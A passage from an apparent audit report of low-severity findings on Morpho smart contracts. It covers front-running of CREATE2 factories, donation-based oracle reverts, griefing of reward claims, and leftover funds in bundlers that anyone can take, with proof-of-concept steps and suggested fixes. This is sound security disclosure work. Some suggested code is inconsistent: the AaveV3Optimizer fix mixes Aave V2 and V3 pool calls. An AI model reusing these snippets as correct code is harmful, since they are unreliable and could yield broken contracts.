It's crucial to ensure that transfer calls can be broken up into smaller batches when dealing with such tokens. Modify the transfer logic to handle large amounts by breaking them into smaller, manageable batches. This can be done by checking the recipient's current balance and the transfer amount, and then splitting the transfer into multiple transactions if necessary. This approach can prevent reverts and ensure successful transaction completion.



### Incorrect amount can lead to revert of the Urd

**Severity:** Low risk

**Context:** [UrdBundler.sol#L21-L21](morpho-blue-bundlers/src/UrdBundler.sol#L21-L21)

**Description**:

The Morpho Blue bundler enables users to bundle calls for different contracts, including the Morpho URD (Universal Rewards Distributor). This is accomplished by incorporating the urdClaim() function in the provided multicall data.

The issue stems from a discrepancy between the documentation and the actual implementation of this function. The function allows users to pass an "amount" parameter, as described below:

```solidity
/// @param amount The amount of the reward token to claim.
```

However, this parameter is directly forwarded to the claim() function of the URD, which is incorrect when examining the documentation of the URD:

```solidity
/// @param claimable The overall claimable amount of token rewards.
```

```solidity
amount = claimable - claimed[account][reward];
```

Contrary to the user's expectation, the URD interprets the provided "claimable" parameter as the total claimable amount of token rewards over all time. The function then deducts the previously claimed balance, transmitting the difference. For instance, a user who has already claimed 10 tokens and is eligible to claim an additional 2 tokens in the new distribution might (adhering to the documentation) call the urdClaim() function with the value of 2, resulting in a revert in the claim function.

**Recommendation**:

Mitigate this issue through one of the following methods:

Documentation:

If the implemented functionality is intentional, update the documentation of the parameter to read `@param amount The overall claimable amount of token rewards.`

Calculation:

If the comment accurately describes the intended functionality, adapt the function call to claim as follows:

```solidity
uint256 claimable = amount + IUniversalRewardsDistributor(distributor).claimed(initiator(), reward);
IUniversalRewardsDistributor(distributor).claim(account, reward, claimable, proof)
```




### [L] Lack of address(0) check on deployment of URD can result in UniversalRewardsDistributor without an Owner

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

**Description**

The UniversalRewardsDistributor contract, as part of Morpho's infrastructure, is responsible for distributing various rewards tokens to users. A critical aspect of this contract is the role of the owner, who possesses the authority to make significant changes to the contract's operation, including updating the merkle root and setting timelocks. The contract is created through the UrdFactory contract, which uses the CREATE2 opcode for deployment.

The issue:

The UniversalRewardsDistributor's constructor does not include a check to ensure that the initialOwner 
address provided is not the zero address (address(0)). This oversight can lead to the deployment of a 
UniversalRewardsDistributor contract without a valid owner, potentially causing several issues.

If the initialOwner is set to address(0), the contract may not function as intended. 
Key functionalities that require owner permissions could be inaccessible, leading to operational challenges.

This includes all of the owner led functionality within the URD.



**Recommendation**:


Its best practice to include a check in the constructor to ensure that the initialOwner is not the zero address. 
This will prevent the deployment of a UniversalRewardsDistributor contract without a valid owner.

require(initialOwner != address(0), ErrorsLib.ZERO_ADDRESS);



### Irrecoverable state after initial approval is consumed fully

**Severity:** Low risk

**Context:** [MetaMorpho.sol#L133-L133](metamorpho/src/MetaMorpho.sol#L133-L133)

**Description**: Metamorpho contract `forceApprove` morpho contract to max value of uint256 during the creation of the contract. However this approved amount can be consumed over time, and there is no way to re-approve.

**Recommendation**: Add a way for the owner / some actor to increase the allowance to `morpho` anytime.




### Authorization Inconsistency Between Morpho.sol and MetaMorpho.sol contracts preventing delegated withdrawals

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

- Description
In the `Morpho` contract, suppliers have the ability to authorize other users to withdraw their supplied assets. This feature is designed to provide flexibility in managing assets. However, when these authorized users attempt to withdraw the supplied assets through the `MetaMorpho.sol` contract, they encounter an issue where the withdrawal is not possible.

- [`Morpho.sol#withdraw()`](https://github.com/morpho-org/morpho-blue/blob/main/src/Morpho.sol#L197-L227) function
```solidity
	function withdraw(
        MarketParams memory marketParams,
        uint256 assets,
        uint256 shares,
        address onBehalf,
        address receiver
    ) external returns (uint256, uint256) {
        Id id = marketParams.id();
        require(market[id].lastUpdate != 0, ErrorsLib.MARKET_NOT_CREATED);
        require(UtilsLib.exactlyOneZero(assets, shares), ErrorsLib.INCONSISTENT_INPUT);
        require(receiver != address(0), ErrorsLib.ZERO_ADDRESS);
        // No need to verify that onBehalf != address(0) thanks to the following authorization check.
        require(_isSenderAuthorized(onBehalf), ErrorsLib.UNAUTHORIZED); ///@note

        _accrueInterest(marketParams, id);

        if (assets > 0) shares = assets.toSharesUp(market[id].totalSupplyAssets, market[id].totalSupplyShares);
        else assets = shares.toAssetsDown(market[id].totalSupplyAssets, market[id].totalSupplyShares);

        position[id][onBehalf].supplyShares -= shares;
        market[id].totalSupplyShares -= shares.toUint128();
        market[id].totalSupplyAssets -= assets.toUint128();

        require(market[id].totalBorrowAssets <= market[id].totalSupplyAssets, ErrorsLib.INSUFFICIENT_LIQUIDITY);

        emit EventsLib.Withdraw(id, msg.sender, onBehalf, receiver, assets, shares);

        IERC20(marketParams.loanToken).safeTransfer(receiver, assets);

        return (assets, shares);
    }
```

While `Morpho` allows for delegated withdrawal permissions, `MetaMorpho` lack the necessary logic to recognize and honor these permissions. This discrepancy leads to situation where authorized withdrawals cannot be executed through `MetaMorpho.sol` contract, despite being valid in the particular `Morpho Market`.

- [`MetaMorpho.sol#withdraw()`](https://github.com/morpho-org/metamorpho/blob/main/src/MetaMorpho.sol#L585-L596) function flow
```solidity
	function withdraw(uint256 assets, address receiver, address owner) public override returns (uint256 shares) {
        uint256 newTotalAssets = _accrueFee();

        // Do not call expensive `maxWithdraw` and optimistically withdraw assets.

        shares = _convertToSharesWithTotals(assets, totalSupply(), newTotalAssets, Math.Rounding.Ceil);

        // `newTotalAssets - assets` may be a little off from `totalAssets()`.
        _updateLastTotalAssets(newTotalAssets.zeroFloorSub(assets));

        _withdraw(_msgSender(), receiver, owner, assets, shares);
    }

// ...code...

	function _withdraw(address caller, address receiver, address owner, uint256 assets, uint256 shares)
        internal
        override
    {
        _withdrawMorpho(assets);

        super._withdraw(caller, receiver, owner, assets, shares);
    }

// ...code...

	function _withdrawMorpho(uint256 assets) internal {
        for (uint256 i; i < withdrawQueue.length; ++i) {
            Id id = withdrawQueue[i];
            MarketParams memory marketParams = _marketParams(id);
            (uint256 supplyAssets,, Market memory market) = _accruedSupplyBalance(marketParams, id);

            uint256 toWithdraw = UtilsLib.min(
                _withdrawable(marketParams, market.totalSupplyAssets, market.totalBorrowAssets, supplyAssets), assets
            );

            if (toWithdraw > 0) {
                // Using try/catch to skip markets that revert.
                try MORPHO.withdraw(marketParams, toWithdraw, 0, address(this), address(this)) {
                    assets -= toWithdraw;
                } catch {}
            }

            if (assets == 0) return;
        }

        if (assets != 0) revert ErrorsLib.NotEnoughLiquidity();
    }
```

- Proof of Concept
1. A supplier in the `Morpho` contract authorizes another user to withdraw their assets via [`Morpho.sol#setAuthorization()`](https://github.com/morpho-org/morpho-blue/blob/main/src/Morpho.sol#L428-L432) function.
2. The authorized user then tries to withdraw these assets via the `MetaMorpho` contract.
3. The transaction fails because `MetaMorpho` does not recognize or honor the withdrawal authorization set in the `Morpho` contract.

The main impact is the lack of integration or consistency between the authorization mechanisms of `Morpho Markets` and the withdrawal functionalities of `MetaMorpho.sol` contracts.

- Recommendation
Implement logic in `MetaMorpho` contract to include checks for withdrawal authorizations set in the `Morpho` contract.



### bundle ERC20WrapperBundler functions doesn't have payable modifier which is against the docs	_(duplicate of [`ERC20WrapperBundler.erc20WrapperDepositFor` not payable])_

**Severity:** Low risk

**Context:** [ERC20WrapperBundler.sol#L30-L30](morpho-blue-bundlers/src/ERC20WrapperBundler.sol#L30-L30)

according to the doc, Bundle function most be payable so they can be used when the original call have `msg.value > 0` because each task is done with delegatecall.

but the functions in this contract is not payable: `erc20WrapperDepositFor()`  and `erc20WrapperWithdrawTo()`. These function can't be used always and their implementation is deviates from the doc(doesn't have payable modifier). this undermines the Bundles functionality.

i believe this has Medium severity because implementation is not what was intended.



### `claim()` function incorrectly reverts

**Severity:** Low risk

**Context:** [UniversalRewardsDistributor.sol#L127-L127](universal-rewards-distributor/src/UniversalRewardsDistributor.sol#L127-L127)

**Description:**

The documentation for the Universal Rewards Distributor (URD) outlines the configuration requirements for the Merkle tree to ensure users can successfully claim their distributed rewards. The description asserts that "If a claimer has claimed an amount higher than the `claimable` amount in the Merkle tree (if claimed from a previous root), the claim will revert with a 'root misconfigured' error." This requirement can also be expressed as `if (claimed[account][reward] > claimable) revert;`. However, the actual implementation deviates from this documentation, as it is written as `require(claimable > claimed[account][reward], ErrorsLib.CLAIMABLE_TOO_LOW);`.

In scenarios where `claimed[account][reward] == claimable`, as indicated by the documentation, the claim function should not revert. However, in the current implementation, this function call will result in a revert.

**Recommendation:**

To align the implementation with the documented requirement, the `require` statement should be modified to `require(claimable >= claimed[account][reward], ErrorsLib.CLAIMABLE_TOO_LOW);`. This adjustment ensures that the claim function does not revert when `claimed[account][reward]` is equal to `claimable`.

Alternatively, a more user-friendly approach is to update the documentation to accurately reflect the implemented logic. The sentence can be revised to "If a claimer has claimed an amount higher than or equal to the `claimable` amount in the Merkle tree (if claimed from a previous root), the claim will revert with a 'root misconfigured' error." This clarifies the behavior and aligns with the existing code implementation.



### ETH left in multicall can be stolen	_(duplicate of [Bundler doesn't return exces funds in its balance in the end and the reaminging funds in the Bundler will be lost])_

**Severity:** Low risk

**Context:** [BaseBundler.sol#L51-L51](morpho-blue-bundlers/src/BaseBundler.sol#L51-L51)

**Description:**

The multicall functionality of the bundler enables the transfer of ETH and tokens by anyone. If not all of these ETH and tokens are consumed in a call, they remain in the bundler, and anyone can withdraw them.

While it's impractical to verify the utilization of all `ERC20` tokens, as acknowledged in the comment "Assumes that any tokens left on the contract can be seized by anyone," it is feasible to secure the contract against residual ETH after a multicall.

**Recommendation:**

For enhanced user safety, even in cases of misuse, it is advisable to implement a safeguard preventing leftover ETH in the contract after a multicall. This can be achieved by checking if the bundler's balance is greater than 0 at the end of a multicall and, if so, transferring back all remaining funds.

```solidity
if (address(this).balance > 0) {
    (msg.sender).call{value: address(this).balance}("");
}
```

Appending this code snippet at the end of the `multicall()` function would effectively mitigate the outlined issue.



### Funds can get stuck in trustless URD

**Severity:** Low risk

**Context:** [UniversalRewardsDistributor.sol#L68-L68](universal-rewards-distributor/src/UniversalRewardsDistributor.sol#L68-L68)

**Description:**

The Morpho periphery introduces the `UniversalRewardsDistributor` (URD), designed to facilitate the distribution of rewards to addresses based on a predefined scheme. The URD can be deployed in a trustless manner by omitting the specification of an owner and solely setting an initial root. This design allows for a one-time distribution without any possibility of owner interference.

The identified issue arises from the absence of a check to verify that the sum of amounts intended for distribution in a Merkle tree aligns with the amount transferred into the URD. In a standard deployment, this misalignment is typically manageable, as the Merkle tree can be adjusted to fully distribute the provided amount. However, in the case of a trustless URD, this discrepancy can result in funds becoming frozen within the contract. This predicament occurs due to the burning of ownership and the absence of updaters, preventing the setting of a new root.

**Recommendation:**

Two mitigation approaches can be considered:

**Complex Option (Non-Optimal):**

Require a direct transfer of funds at the initiation of a trustless URD, specifying that this amount must be passed in the constructor. While this implementation addresses the issue, it introduces significant complexity to the contract, potentially undermining the intended simplicity of the URD.

**Simpler and Preferred Option:** 

Maintain the current functionality but enhance the documentation with a warning to users. Emphasize the need for users to verify that the sum of amounts in their Merkle tree distribution aligns precisely with the funds they intend to transfer into the trustless URD. This way, users can avoid unintended loss of extra funds due to the described discrepancy.

The preferred option provides a balance between simplicity and user awareness, ensuring that users are informed about the critical verification step while interacting with the trustless URD.



### MetaMorphoFactory deployment can be frontrunned	_(duplicate of [Using CREATE2 with a user-specified `salt` makes `createMetaMorpho()` susceptible to front-running])_

**Severity:** Low risk

**Context:** [MetaMorphoFactory.sol#L43-L43](metamorpho/src/MetaMorphoFactory.sol#L43-L43)

**Description:**

Within the Morpho periphery, the `MetaMorpho` contract serves as a mechanism for managing positions in up to 20 morpho blue markets. Deploying `MetaMorpho` contracts is orchestrated through the `MetaMorphoFactory` contract, specifically using the `createMetaMorpho()` function:

```solidity
function createMetaMorpho(
	address initialOwner,
	uint256 initialTimelock,
	address asset,
	string memory name,
	string memory symbol,
	bytes32 salt
) external returns (MetaMorpho metaMorpho) {
	metaMorpho = new MetaMorpho{salt: salt}(initialOwner, MORPHO, initialTimelock, asset, name, symbol);
	
	isMetaMorpho[address(metaMorpho)] = true;
	
	emit EventsLib.CreateMetaMorpho(
	address(metaMorpho), msg.sender, initialOwner, initialTimelock, asset, name, symbol, salt
	);
}
```

The vulnerability arises from the potential frontrunning of the `createMetaMorpho()` function, allowing an attacker to deploy their own `MetaMorpho` contract with identical parameters as the legitimate deployer. Consequently, when users call `createMetaMorpho()`, their transactions will revert. This issue poses a risk to users calling the function from their protocols, especially when bundling it with other calls. There is also an additional concern due to the absence of documentation, potentially leading users to deploy their protocols without awareness of this potential threat.

**Recommendation:**

To mitigate this vulnerability, it is recommended to incorporate the `msg.sender` address into the salting process of the `CREATE2` call. This can be achieved by hashing the provided salt together with the `msg.sender` address using `keccak256` and utilizing the result as the actual salt for the deployment:

```solidity
bytes32 deploymentSalt = keccak256(abi.encode(msg.sender, salt));

metaMorpho = new MetaMorpho{salt: deploymentSalt}(initialOwner, MORPHO, initialTimelock, asset, name, symbol);
```

This modification ensures that users can still select a salt for precomputing the address of the deployed `MetaMorpho`, while safeguarding against the risk of an attacker frontrunning the `createMetaMorpho()` call and disrupting user transactions.



### Pending root also gets replaced if new value == root	_(duplicate of [No check against current root and ipfshash checks are done in subitRoot])_

**Severity:** Low risk

**Context:** [UniversalRewardsDistributor.sol#L80-L80](universal-rewards-distributor/src/UniversalRewardsDistributor.sol#L80-L80)

**Description:**

The documentation for the Universal Rewards Distributor (URD) in `Readme.md` outlines the functionalities of the Updater role, describing the ability to submit a new root that, under specific circumstances, overwrites the pending root. This is described as "If a pending value is not used as the main root, any submissions by updaters will override the pending value." Unfortunately, this statement is inaccurate, as the pending value can also be overwritten if the `newRoot` is equal to the current `root`. The function `submitRoot()` only checks for `newRoot != pendingRoot.root`, neglecting the scenario where `newRoot` equals the current `root`.

**Recommendation:**

To achieve the intended functionality, it is recommended to include an additional check for `newRoot != root` in the `submitRoot()` function. The modified function could look like this:

```solidity
function submitRoot(bytes32 newRoot, bytes32 newIpfsHash) external onlyUpdaterRole {
	require((newRoot != pendingRoot.root && newRoot != root) || newIpfsHash != pendingRoot.ipfsHash, ErrorsLib.ALREADY_PENDING);
	
	pendingRoot = PendingRoot({root: newRoot, ipfsHash: newIpfsHash, validAt: block.timestamp + timelock});
	
	emit EventsLib.PendingRootSet(msg.sender, newRoot, newIpfsHash);
}
```



### UrdFactory deployment can be frontrunned	_(duplicate of [Using CREATE2 with a user-specified `salt` makes `createMetaMorpho()` susceptible to front-running])_

**Severity:** Low risk

**Context:** [UrdFactory.sol#L26-L26](universal-rewards-distributor/src/UrdFactory.sol#L26-L26)

**Description:**

Within the Morpho periphery, the `UniversalRewardsDistributor` contract facilitates the distribution of rewards from a market. The deployment of `UniversalRewardsDistributor` contracts is managed by the `UrdFactory` contract through the `createUrd()` function:

```solidity
function createUrd(
	address initialOwner,
	uint256 initialTimelock,
	bytes32 initialRoot,
	bytes32 initialIpfsHash,
	bytes32 salt
) public returns (UniversalRewardsDistributor urd) {
	urd = new UniversalRewardsDistributor{salt: salt}(
		initialOwner,
		initialTimelock,
		initialRoot,
		initialIpfsHash
	);
	
	isUrd[address(urd)] = true;
	
	emit EventsLib.UrdCreated(
		address(urd), msg.sender, initialOwner, initialTimelock, initialRoot, initialIpfsHash, salt
	);
}
```

The vulnerability arises from the potential frontrunning of the `createUrd()` function, allowing an attacker to deploy their own `UniversalRewardsDistributor` contract with identical parameters as the genuine deployer. Consequently, when the actual caller calls `createUrd()`, his transactions will revert. Nevertheless the `UniversalRewardsDistributor` that the attacker has deployed will have the same parameters as the one by the actual caller. This issue poses a risk to users calling the function from their protocols, especially when bundling it with other calls, potentially resulting in a Denial-of-Service (DoS) scenario if exploited by a malicious frontrunner. The lack of documentation exacerbates the risk, as users might unwittingly deploy their protocols without awareness of this potential threat.

**Recommendation:**

To mitigate this vulnerability, it is recommended to incorporate the `msg.sender` address into the salting process of the `CREATE2` call. This can be achieved by hashing the provided salt together with the `msg.sender` address using `keccak256` and utilizing the result as the actual salt for the deployment:

```solidity
bytes32 deploymentSalt = keccak256(abi.encode(msg.sender, salt));

urd = new UniversalRewardsDistributor{salt: deploymentSalt}(
	initialOwner,
	initialTimelock,
	initialRoot,
	initialIpfsHash
);
```

This modification ensures that users can still select a salt for precomputing the address of the deployed `Urd`, while safeguarding against the risk of an attacker frontrunning the `createUrd()` call and disrupting user transactions.



### attacker can fake claim others claims if token UniversalRewardDistributor get deployed before token contract	_(duplicate of [Aattacker can claim user onbehalf to inflate the claimed balance if token address not deployed and merkle tree root not set])_

**Severity:** Low risk

**Context:** [UniversalRewardsDistributor.sol#L115-L115](universal-rewards-distributor/src/UniversalRewardsDistributor.sol#L115-L115)

as code use solmate safeTransferLib library, and code doesn't check that token address has code, so even if token contract was empty and not yet deployed, function `claim()` would be callable. this would create a windows of opportunity for attacker if for a project UniversalRewardDistributor get deployed before token contract. attacker can call `claim()` for other users and set `claimed[][]` for those addresses and reward token while those users receiving nothing.

because it's not mentioned in the docs that reward tokens should be exists and deployed before UniversalRewardDistributor, so this risk is not known for users.

This is POC for this attack:
1. project A wants to give airdrops for community members but Project token is not yet deployed.
2. to make users sure that they are gonna receive the airdrops and Project token, project would deploy a UniversalRewardDistributor contract set merkle tree root hash based on user rewards, while token contract is not yet deployed but the token address is defined.
3. now attacker can call `claim()` for users and mark their `claimed[][]`. 
4. after token deployment users won't be able to receive their funds.




either check reward token existence or alarm users about this risk.



### if oracle uses vault, then attacker can increase Vault's pps by donation and cause rever for `price()`

**Severity:** Low risk

**Context:** [ChainlinkOracle.sol#L116-L116](morpho-blue-oracles/src/ChainlinkOracle.sol#L116-L116)

if Vault has been used, then attacker can donate underlying vault token to Vault and increase PPS and cause `price()` to revert. I know that preconditions are  that:
> The vault's sample shares quoted as assets and the base feed prices don't overflow when multiplied.

but the issue here is that even if someone creates a valid oracle with valid vault that follows the preconditions and users interact with morpho blue market that uses that oracle for a while, later attacker can perform this attack permissionless. so there is always risk that oracle become broken and then liquidation and borrow and collateral withdraw won't work on the market that use this oracle and lenders/borrowers would lose funds.

this risk should be mentioned in the docs that oracle shouldn't use vaults that use `token.balanceOf()`, because those vault can be manipulated by direct token donation.



### A forged approval will block the bundler

**Severity:** Low risk

**Context:** [BaseBundler.sol#L93-L93](morpho-blue-bundlers/src/BaseBundler.sol#L93-L93)

**Improved Description:**

The bundler employs the `_approveMaxTo()` function to grant approvals to addresses it interacts with, utilizing `type(uint256).max`.

```solidity
function _approveMaxTo(address asset, address spender) internal {
    ERC20(asset).safeApprove(spender, 0);  // Resetting approval to 0
    ERC20(asset).safeApprove(spender, type(uint256).max);
}
```

This function is invoked before each bundler call that triggers an external address to invoke `transferFrom()` on the bundler. The vulnerability emerges if an attacker can somehow (e.g., through forgery) grant an approval of 1 wei from the contract to the external address. In such a scenario, the subsequent call to the bundler would bypass the approval in `_approveMaxTo()` as it is not equal to zero. However, the call is likely to revert if it necessitates an approval greater than 1.

**Recommendation:**

While this issue is not currently exploitable, a precautionary design decision to avert potential vulnerabilities is to initially reset the approval to 0 within each call to `_approveMaxTo()` and subsequently grant a new approval of `type(uint256).max`. This approach ensures that the functionality cannot be obstructed, mitigating the risk of future exploits.



### ERC20WrapperBundler is missing payable on the external calls	_(duplicate of [`ERC20WrapperBundler.erc20WrapperDepositFor` not payable])_

**Severity:** Low risk

**Context:** [ERC20WrapperBundler.sol#L30-L30](morpho-blue-bundlers/src/ERC20WrapperBundler.sol#L30-L30), [ERC20WrapperBundler.sol#L47-L47](morpho-blue-bundlers/src/ERC20WrapperBundler.sol#L47-L47)

- Bug Description

The MetaMorpho Periphery employs multiple bundlers to aggregate calls into a multicall, optimizing gas fees for users. These bundlers are further integrated into the `EthereumBundler`, enabling users to construct multicalls encompassing various functionalities.

In the context of multicalls, some bundled calls involve the transfer of ETH, and thus, the `msg.value` of these calls can exceed 0. Consequently, every function eligible for inclusion in a multicall must be marked as payable; otherwise, the entire multicall will revert. This necessity is explicitly highlighted in a comment within the base bundler, emphasizing that "Every bundler inheriting from this contract must have their external functions payable as they will be delegate called by the `multicall` function (which is payable and might pass a non-null ETH value). It is recommended not to rely on `msg.value` as the same value can be reused for multiple calls."

Unfortunately, the functions `erc20WrapperDepositFor()` and `erc20WrapperWithdrawTo()` lack the payable modifier. Consequently, any multicall that includes these functions and has `msg.value > 0` will result in a revert.

- Impact

This issue exposes a Denial-of-Service (DoS) vulnerability on multicalls that involve one of the ERC20Wrapper functionalities, coupled with a non-zero `msg.value`.

- Proof of Concept

The provided proof of concept illustrates the vulnerability:

```solidity
function testERC20FailsNonPayable() public
{
    //------------------SETUP-----------------------//
    address user = vm.addr(456);
    MarketParams memory marketParams = _randomMarketParams(123);

    vm.deal(USER, 1 ether);

    deal(marketParams.loanToken, user, 100);

    //------------------TEST-----------------------//

    //First we transfer some ETH
    bundle.push(_nativeTransfer(address(123), 1 ether));

    //Then we transfer some tokens to wrap them
    bundle.push(_erc20WrapperDepositFor(marketParams.loanToken, 100));

    //Now we run the calls
    vm.expectRevert();
    bundler.multicall{value: 1 ether}(bundle);

    //Reverted due to not being payable
}
```

The testcase can be executed by adding it to the `EthereumBundlerEthereumTest.col`file and running it using `forge test -vvvv --match-test "testERC20FailsNonPayable"`.

- Recommended Mitigation Steps

To rectify this issue, it is essential to add the payable keyword to the functions `erc20WrapperDepositFor()` and `erc20WrapperWithdrawTo()`. This modification ensures that these functions can be seamlessly integrated into any multicall combination generated within the bundler. Applying this mitigation step prevents revert issues arising from multicalls with non-zero `msg.value`, enhancing the overall robustness of the MetaMorpho Periphery.



### Flawed Debt Repayment in AaveV3Optimizer	_(duplicate of [Cannot use `uint256.max` to repay the balance of `AaveV2MigrationBundler`])_

**Severity:** Low risk

**Context:** [AaveV3OptimizerMigrationBundler.sol#L39-L39](morpho-blue-bundlers/src/migration/AaveV3OptimizerMigrationBundler.sol#L39-L39)

- Description:

The Morpho bundler facilitates the bundling of calls to AAVE V3 pools, including the `aaveV3OptimizerRepay()` function designed for repaying a user's debt on an Aave V3 pool. Users can specify the repayment amount using the `amount` parameter, and a feature is activated when users pass `type(uint256).max` as the amount, as highlighted in the documentation snippet:

```solidity
/// @param amount The amount of `underlying` to repay. Pass `type(uint256).max` to repay the bundler's `underlying`
/// balance.
```

However, an error exists in the corresponding implementation of this functionality within the following conditional statement:

```solidity
if (amount != type(uint256).max) amount = Math.min(amount, ERC20(underlying).balanceOf(address(this)));
```

Regrettably, when a user passes `type(uint256).max`, the amount is directly forwarded to `AAVE_V3_OPTIMIZER.repay()`, bypassing the utilization of the bundler's balance. A closer examination of the Aave V3 pool contract reveals that Aave handles the `type(uint256).max` case differently, as described in the following comment found [here](https://github.com/aave/aave-v3-core/blob/master/contracts/interfaces/IPool.sol#L316-L317):

```solidity
* @param amount The amount to repay
* - Send the value type(uint256).max in order to repay the whole debt for `asset` on the specific `debtMode`
```

Aave attempts to recover the entire debt from the bundler's balance, resulting in a revert if `paybackAmount > token.balanceOf(bundler)`. If `paybackAmount < token.balanceOf(bundler)`, tokens are left inside the bundler, becoming susceptible to theft by any entity calling the bundler and transferring them out.

- Impact:

This vulnerability poses the risk of potential user fund loss when `paybackAmount < token.balanceOf(bundler)`. Users, following the `aaveV3OptimizerRepay()` documentation, may construct their multicall under the assumption that the bundler utilizes all remaining funds for the repayment. Contrary to this expectation, the bundler retains the difference, leaving it inside and vulnerable to theft by any entity calling the bundler and transferring out the leftover funds.

- POC

An exemplary proof can be described in the following steps.

1. The user initiates a bundle of multiple calls, concluding with a call to `aaveV3OptimizerRepay()` with `type(uint256).max` to utilize the remaining 10 tokens after the previous calls to repay a debt.
2. The call with `type(uint256).max` is directed to Aave through the following function:
```solidity
function aaveV3OptimizerRepay(address underlying, uint256 amount) external payable protected {
	if (amount != type(uint256).max) amount = Math.min(amount, ERC20(underlying).balanceOf(address(this)));
	
	require(amount != 0, ErrorsLib.ZERO_AMOUNT);
	  
	_approveMaxTo(underlying, address(AAVE_V3_OPTIMIZER));
	
	AAVE_V3_OPTIMIZER.repay(underlying, amount, initiator());
}
```
3. Aave recognizes the `type(uint256).max` and calculates the total debt the user still has (5 tokens).
4. Aave withdraws the 5 tokens from the bundler using `transferFrom()`.
5. The multicall execution concludes.
6. Despite the intended use, 5 tokens remain within the contract and are susceptible to being stolen by any entity.
- Recommendation:

To align with the intended functionality, the implementation of `aaveV3OptimizerRepay()` requires adjustment, specifically the removal of the conditional statement surrounding the reduction of the amount. An improved example is provided below:

```solidity
function aaveV3OptimizerRepay(address asset, uint256 amount, uint256 interestRateMode) external payable protected {
	if (amount == type(uint256).max) amount = Math.min(amount, ERC20(asset).balanceOf(address(this)));
	
	require(amount != 0, ErrorsLib.ZERO_AMOUNT);
	
	_approveMaxTo(asset, address(AAVE_V2_POOL));
	
	AAVE_V3_POOL.repay(asset, amount, interestRateMode, initiator());
}
```




### Incorrect Debt Repayment in AaveV2 due to type(uint256).max Parameter	_(duplicate of [Cannot use `uint256.max` to repay the balance of `AaveV2MigrationBundler`])_

**Severity:** Low risk

**Context:** [AaveV2MigrationBundler.sol#L42-L42](morpho-blue-bundlers/src/migration/AaveV2MigrationBundler.sol#L42-L42)

- Description:

Within the Morpho bundler, a feature enables users to bundle calls to AAVE V2 pools. Specifically, the `aaveV2Repay()` function is designed for repaying a user's debt on an Aave V2 pool. This function allows users to specify the repayment amount using the `amount` parameter. An interesting functionality is triggered when a user passes `type(uint256).max` as the amount, as indicated in the documentation snippet:

```solidity
@param amount The amount of `asset` to repay. Pass `type(uint256).max` to repay the bundler's `asset` balance.
```

However, the corresponding implementation of this functionality has an error in the following conditional statement:

```solidity
if (amount != type(uint256).max) amount = Math.min(amount, ERC20(asset).balanceOf(address(this)));
```

Unfortunately, in the case where a user passes `type(uint256).max`, the amount is directly forwarded to `AAVE_V2_POOL.repay()`, without utilizing the balance of the bundler. A closer examination of the Aave V2 pool contract reveals that Aave handles the `type(uint256).max` case differently, as described in the following comment found [here](https://github.com/aave/protocol-v2/blob/1.0/contracts/protocol/lendingpool/LendingPool.sol#L229-L230):

```solidity
* @param amount The amount to repay
* - Send the value type(uint256).max in order to repay the whole debt for `asset` on the specific `debtMode`
```

Aave attempts to recover the entire debt from the bundler's balance, leading to a revert if `paybackAmount > token.balanceOf(bundler)`. If `paybackAmount < token.balanceOf(bundler)` tokens will be left inside the bundler, resulting in anyone being able to steal them.

- Impact:

This vulnerability introduces the risk of potential user fund loss when `paybackAmount < token.balanceOf(bundler)`. Users, following the `aaveV2Repay()` documentation, will construct their multicall under the assumption that the bundler utilizes all remaining funds for the repayment. Contrary to this expectation, the bundler retains the difference, leaving it inside. Subsequently, these leftover funds become susceptible to theft by any entity calling the bundler and transferring them out.

- POC

An illustrative proof of concept can be outlined through the following steps:

1. The user compiles multiple calls, concluding with a call to `aaveV2Repay()` utilizing `type(uint256).max`. The intention is to utilize the remaining 10 tokens, after the execution of the preceding calls, to repay a debt.
2. The call is directed to Aave, specifying `type(uint256).max` to signify the desire to use the entire remaining balance in the bundler. The function code is as follows:

```solidity
function aaveV2Repay(address asset, uint256 amount, uint256 interestRateMode) external payable protected {
	if (amount != type(uint256).max) amount = Math.min(amount, ERC20(asset).balanceOf(address(this)));
	
	require(amount != 0, ErrorsLib.ZERO_AMOUNT);
	
	_approveMaxTo(asset, address(AAVE_V2_POOL));
	
	AAVE_V2_POOL.repay(asset, amount, interestRateMode, initiator());
}
```

3. Aave recognizes the `type(uint256).max` and calculates the total debt the user still has (e.g., 5 tokens).
4. Aave withdraws the 5 tokens from the bundler using the `transferFrom()` method.
5. The multicall execution is completed.
6. Despite the intended repayment, 5 tokens remain within the contract, presenting an opportunity for unauthorized individuals to seize them.

- Recommendation:

To align with the intended functionality, the implementation of `aaveV2Repay()` requires adjustment, specifically the removal of the conditional statement surrounding the reduction of the amount. An improved example is provided below:

```solidity
function aaveV2Repay(address asset, uint256 amount, uint256 interestRateMode) external payable protected {
	if (amount == type(uint256).max) amount = Math.min(amount, ERC20(asset).balanceOf(address(this)));
	
	require(amount != 0, ErrorsLib.ZERO_AMOUNT);
	
	_approveMaxTo(asset, address(AAVE_V2_POOL));
	
	AAVE_V2_POOL.repay(asset, amount, interestRateMode, initiator());
}
```




### Incorrect Debt Repayment in AaveV3 Caused by Passing type(uint256).max	_(duplicate of [Cannot use `uint256.max` to repay the balance of `AaveV3MigrationBundler`])_

**Severity:** Low risk

**Context:** [AaveV3MigrationBundler.sol#L39-L39](morpho-blue-bundlers/src/migration/AaveV3MigrationBundler.sol#L39-L39)

- Description:

In the Morpho bundler, users can leverage a feature to bundle calls to AAVE V3 pools, notably through the `aaveV3Repay()` function, designed for repaying a user's debt on an Aave V3 pool. Users can specify the repayment amount using the `amount` parameter, with a distinctive functionality activated when a user passes `type(uint256).max`, as stated in the documentation:

```solidity
@param amount The amount of `asset` to repay. Pass `type(uint256).max` to repay the bundler's `asset` balance.
```

However, an issue arises in the implementation of this functionality due to an error in the conditional statement:

```solidity
if (amount != type(uint256).max) amount = Math.min(amount, ERC20(asset).balanceOf(address(this)));
```

Regrettably, when a user passes `type(uint256).max`, the amount is directly sent to `AAVE_V3_POOL.repay()`, ignoring the bundler's balance. Examining the Aave V3 pool contract reveals that Aave handles the `type(uint256).max` case differently, as described in this [comment](https://github.com/aave/aave-v3-core/blob/master/contracts/interfaces/IPool.sol#L316-L317):

```solidity
* @param amount The amount to repay
* - Send the value type(uint256).max in order to repay the whole debt for `asset` on the specific `debtMode`
```

Aave attempts to recover the entire debt from the bundler's balance, resulting in a revert if `paybackAmount > token.balanceOf(bundler)`. In cases where `paybackAmount < token.balanceOf(bundler)`, tokens are left inside the bundler, susceptible to theft by anyone.

- Impact:

